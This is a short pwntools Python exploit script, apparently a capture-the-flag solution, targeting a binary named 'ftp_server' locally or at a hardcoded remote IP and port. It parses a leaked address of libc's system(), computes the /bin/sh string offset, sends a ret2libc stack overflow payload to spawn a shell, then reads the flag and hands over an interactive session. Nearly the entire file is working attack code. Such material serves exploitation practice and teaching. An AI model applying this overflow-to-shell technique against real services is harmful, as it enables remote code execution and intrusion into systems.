from pwn import *
from IPython import *

exe = './ftp_server'


(host,port) = ("34.141.1.253", 30406)


def start(argv=[], *a, **kw):
    if args.GDB:       
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.RE:
        return remote(host,port)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b *0x080492ea
c
'''.format(**locals())

context.terminal = ["gnome-terminal", "--"]

# ====================[EXPANSIONS]=========================

se  = lambda data  : p.send(data)
sl  = lambda data  : p.sendline(data)
sa  = lambda ip,op : p.sendafter(ip,op)
sla = lambda ip,op : p.sendlineafter(ip,op) 
rvu = lambda data  : p.recvuntil(data)
rvl = lambda       : p.recvline()
rv  = lambda nbyts : p.recv(nbyts)  
pop = lambda       : p.interactive()

# >>>>>>>>>>>>>>>>[EXPLOIT STARTS HERE]>>>>>>>>>>>>>>>>>>>>

p = start()

sl(b'a')

rvu("at: ")

system = int(rvl().strip(), 16)
binsh = system + 0x174f65
ret = 0x0804900e

payload = b'a'*0x50
payload += p32(ret)
payload += p32(system)
payload += p32(0)
payload += p32(binsh)
sl(payload)
sl(b'cat flag*')

pop()

